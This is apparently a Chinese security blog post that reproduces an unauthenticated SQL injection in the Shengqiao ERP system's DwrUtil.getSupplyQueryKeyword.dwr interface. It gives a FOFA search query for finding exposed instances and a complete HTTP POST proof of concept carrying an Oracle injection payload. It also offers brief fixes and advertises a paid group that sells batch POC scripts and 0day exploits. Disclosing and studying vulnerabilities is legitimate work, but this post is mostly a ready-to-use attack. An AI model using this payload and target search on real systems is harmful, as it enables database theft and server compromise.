#  「漏洞复现」圣乔ERP系统 DwrUtil SQL注入漏洞   
冷漠安全  冷漠安全   2024-12-08 12:21  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
圣乔ERP系统是杭州圣乔科技有限公司开发的一款企业级管理软件，旨在为企业提供一套全面、集成化的管理解决方案，帮助企业实现资源的优化配置和高效利用。该系统集成了财务、人力资源、生产、销售、供应链等多个业务模块，实现了企业内外部信息的无缝连接和实时共享。适用于各种规模的企业，特别是需要实现资源优化配置、提高运营效率和管理水平的企业。它可以帮助企业解决传统管理方式中存在的信息孤岛、数据重复输入、信息传递滞后等问题，提高企业的整体竞争力。  
  
0x03  
  
漏洞威胁  
  
圣乔ERP系统 DwrUtil.getSupplyQueryKeyword.dwr 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
title="圣乔ERP系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pmr8lbbnUdEAOTtalPw5G2C6gFpMwEUV75ZzMOEibjHmQcs5sCFI0Sw35aAfVNAAU8jYGclVlJRdg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /erp/dwr/call/plaincall/DwrUtil.getSupplyQueryKeyword.dwr HTTP/1.1
Host: 
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Content-Type: text/plain
Accept-Encoding: gzip, deflate

callCount=1
page=/erp/dwr/test/DwrUtil
httpSessionId=
scriptSessionId=7D0BA25CD588C62EB9A08A089C7F368D561
c0-scriptName=DwrUtil
c0-methodName=getSupplyQueryKeyword
c0-id=0
c0-param0=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(106)||CHR(122)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (99=99) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(122)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL)
batchId=9
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pmr8lbbnUdEAOTtalPw5G2M4Xrexh0O085flVTwOqeFia1noDspwFBsKPC9gl1pozoEIGkWjk9WQw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pmr8lbbnUdEAOTtalPw5G2EZzwibibDIia39qoeRYSEXu4YicuBDO9o2tiaDmhjhEfSHH3BJOMHibnHZQQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
对用户传入的参数进行限制。  
  
通过防火墙等安全设备设置访问策略，设置白名单访问。  
  
如非必要，禁止公网访问该系统。  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0pmr8lbbnUdEAOTtalPw5G2t1Qb6V79hZiaNbicooofRATykfftRNtgvZTR1Z091CN8BuiawiavQTMI3Q/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pmr8lbbnUdEAOTtalPw5G24rTzoUYWnC3HaBuJOQmOO6UicT1sibcL5UicACz09mpXyNunL4IpmDA4g/640?wx_fmt=gif&from=appmsg "")  
  
  
